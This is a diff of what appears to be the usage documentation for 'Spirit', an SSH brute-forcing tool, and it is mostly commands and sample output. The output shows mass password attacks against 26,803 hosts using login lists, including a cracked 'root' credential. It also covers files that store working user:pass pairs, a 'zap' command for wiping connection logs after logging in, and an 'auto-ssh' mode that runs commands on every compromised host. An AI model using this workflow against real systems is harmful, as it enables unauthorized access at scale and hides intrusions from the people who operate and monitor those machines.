@@ -101,17 +101,25 @@ EOF
 
 # Start bruting...
 $ ./spirit brute
-INFO loaded h.lst with 26803 hosts
+Spirit NPT (v1.30) upgrade by 24 Mar 24 00:00 UTC
+HINT: Use `./spirit zap` to clean connection logs after you login via SSH
+rlimit soft [1048576] hard [1048576]
+INFO loaded b.lst with 26803 hosts
 INFO loaded p.lst with 4881 logins
+INFO randomized hosts
+INFO block [true]
+INFO timeout [5s]
+INFO threads [1024]
 [2478/4653]root:!1qwerty [77]found [33]blocked [1284]threads 20% [====>               ] [20s:1h13m36s]
-failed connections statistics:
-(    7)  ssh: closed network connection 30s timeout
-(    7)  total failed
-results stored in:
-- found.ssh # for quick manual connect
-- found.login # user:pass combinations that worked
-- found.lst # used by `spirit auto-ssh` for connecting en-masse
-[26803]hosts [4000]bruted [3000]found [19803]blocked
+Results
+ |- found.ssh # Prepared SSH command
+ |- found.login # Successful USER:PASS combinations
+ |- found.lst # Syntax for autossh tool
+ |- found.errors # SSH connection error statistics
+Hosts[26803] Bruted[4000] Blocked[19803] Found[3000]
+
+# If you want to go Faster try blocking bad hosts
+./spirit brute --block=true
 
 # Connect to all your found hosts automatically & run commands.
 $ ./spirit auto-ssh --command 'whoami && uptime'
